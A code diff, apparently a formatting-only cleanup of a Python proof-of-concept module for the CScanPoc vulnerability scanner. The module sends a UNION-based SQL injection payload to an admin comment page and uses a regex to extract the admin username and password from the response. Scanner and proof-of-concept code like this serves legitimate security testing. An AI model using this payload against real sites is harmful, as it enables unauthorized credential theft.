@@ -1,6 +1,8 @@
 # coding: utf-8
 import re
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
@@ -41,16 +43,18 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             payload = ("/admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,3,4,"
                        "username,password,7,8,9,10,11%20from%20admin")
             verify_url = self.target + payload
-            content = urllib.request.urlopen(urllib.request.Request(verify_url)).read()
+            content = urllib.request.urlopen(
+                urllib.request.Request(verify_url)).read()
             pattern = re.compile(r'.*?id=[\'"]?pingluntitle[\'"]?.*?value=[\'"]?(?P<username>\w+)[\'"]?'
                                  r'.*?id=[\'"]?pingluncontent[\'"]?.*?>(?P<password>\w+)</textarea>',
                                  re.I | re.S)
